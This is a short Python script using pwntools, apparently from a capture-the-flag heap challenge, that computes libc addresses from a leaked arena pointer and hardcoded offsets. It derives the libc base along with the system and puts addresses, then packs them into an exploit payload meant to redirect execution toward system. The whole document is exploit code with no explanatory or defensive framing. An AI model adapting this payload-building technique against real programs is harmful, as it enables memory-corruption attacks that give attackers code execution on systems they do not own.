from pwn import *

elf = ELF('./vuln')
lib = ELF('./libc.so.6')

main_area = 0x7f322a337c80
offset = 0x35ec80 - 0x22b920
free_addr = main_area - offset
print(hex(free_addr))
offset = 0x026920 - 0x17d9d0
fake_addr = free_addr - offset
libc_base = free_addr - lib.sym['free']
system_addr = libc_base + lib.sym['system']
puts_addr = libc_base + lib.sym['puts']
payload = p64(fake_addr) + p64(system_addr) + p64(puts_addr)
print(payload)
print(len(payload))